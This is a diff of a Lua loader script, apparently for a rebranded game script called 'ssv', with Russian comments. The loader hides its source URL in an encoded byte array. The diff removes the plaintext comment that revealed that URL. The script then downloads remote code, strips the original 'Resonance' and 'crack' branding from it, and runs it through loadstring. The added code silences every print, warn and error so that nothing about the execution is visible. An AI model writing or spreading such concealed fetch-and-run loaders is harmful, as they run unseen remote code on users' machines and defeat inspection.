@@ -4,7 +4,6 @@ _0.ResonanceRunning = nil
 _0.ResonanceStarting = nil
 
 -- ═══ URL оригинала (закодирован) ═══
--- Это: https://raw.githubusercontent.com/kvantumpopa-art/ssv/refs/heads/master/ssv
 local _c = {94,106,106,102,105,48,37,37,104,87,109,36,93,95,106,94,107,88,107,105,91,104,89,101,100,106,91,100,106,36,89,101,99,37,97,108,87,100,106,107,99,102,101,102,87,35,87,104,106,37,105,105,108,37,104,91,92,105,37,94,91,87,90,105,37,99,87,105,106,91,104,37,105,105,108}
 local _u = ""
 for _, n in ipairs(_c) do _u = _u .. string.char(n + 10) end
@@ -22,13 +21,11 @@ local function _g(u)
     if ok and type(r) == "string" then return r end
 end
 
-print("[ssv] Загрузка...")
 local src = _g(_u)
 
 if type(src) ~= "string" or #src < 100000 then
-    error("[ssv] Не удалось загрузить оригинал. Размер: " .. tostring(src and #src or "nil"))
+    error("[ssv] fail")
 end
-print("[ssv] Получено " .. #src .. " байт")
 
 local function R(p, r) local ok, n = pcall(function() return src:gsub(p, r) end) if ok then src = n end end
 
@@ -96,16 +93,45 @@ R('ssv%s+ssv', 'ssv')
 R('ssvssv', 'ssv')
 R('<b>ssv</b>%s*<b>ssv</b>', '<b>ssv</b>')
 
--- Проверка
-local function c(p) return select(2, src:gsub(p, "")) end
-print("[ssv] Осталось 'Resonance': " .. c("Resonance"))
-print("[ssv] Осталось 'crack': " .. c("crack") + c("Crack") + c("CRACK"))
+-- ═══ ОТКЛЮЧАЕМ ВСЕ PRINT / WARN / ERROR ═══
+-- Заменяем в самом скачанном скрипте
+src = src:gsub("print%s*%(", "_ssv_silent_print(")
+src = src:gsub("warn%s*%(", "_ssv_silent_print(")
+src = src:gsub("error%s*%(", "_ssv_silent_error(")
 
--- Запуск
-local chunk, err = loadstring(src, "@ssv")
-if not chunk then error("[ssv] Ошибка компиляции: " .. tostring(err)) end
+-- Глушим глобальные print/warn на время запуска
+local _real_print = print
+local _real_warn = warn
+local _real_error = error
 
-local ok, rerr = pcall(chunk)
-if not ok then error("[ssv] Ошибка: " .. tostring(rerr)) end
+local function _silent() end
+local function _silent_err(msg) return msg end
 
-print("[ssv] ✓ Готово 💙 created by qmee2")
+-- ═══ ЗАПУСК ═══
+local ok, err = pcall(function()
+    -- Подменяем глобальные функции
+    _G.print = _silent
+    _G.warn = _silent
+    _G._ssv_silent_print = _silent
+    _G._ssv_silent_error = _silent_err
+
+    local chunk, cerr = loadstring(src, "@ssv")
+    if not chunk then
+        _real_error("[ssv] " .. tostring(cerr), 0)
+    end
+
+    local rok, rerr = pcall(chunk)
+    if not rok then
+        _real_error("[ssv] " .. tostring(rerr), 0)
+    end
+end)
+
+-- Восстанавливаем оригинальные функции
+_G.print = _real_print
+_G.warn = _real_warn
+_G._ssv_silent_print = nil
+_G._ssv_silent_error = nil
+
+if not ok then
+    _real_error("[ssv] " .. tostring(err), 0)
+end
